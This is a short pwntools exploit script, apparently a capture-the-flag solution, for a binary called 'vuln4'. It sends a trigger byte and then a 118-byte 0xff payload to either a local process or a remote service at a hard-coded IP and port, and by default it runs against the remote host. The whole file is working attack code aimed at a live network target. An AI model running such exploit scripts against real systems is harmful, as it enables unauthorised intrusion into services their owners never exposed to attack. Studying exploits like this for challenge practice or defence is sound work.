from pwn import *

payload = b"\xff" * 118

def local_pwn():
    p = process("./vuln4")

    print(p.recvuntil("input?"))
    p.send(b"g")
    print(p.recvuntil("input: "))
    sleep(2)
    p.sendline(payload)

    print(p.recvline())

def remote_pwn():
    p = remote("45.33.118.86", 9994)

    print(p.recvuntil("input?"))
    p.send(b"g")
    print(p.recvuntil("input:"))
    sleep(2)
    p.sendline(payload)

    print(p.recvline())

remote_pwn()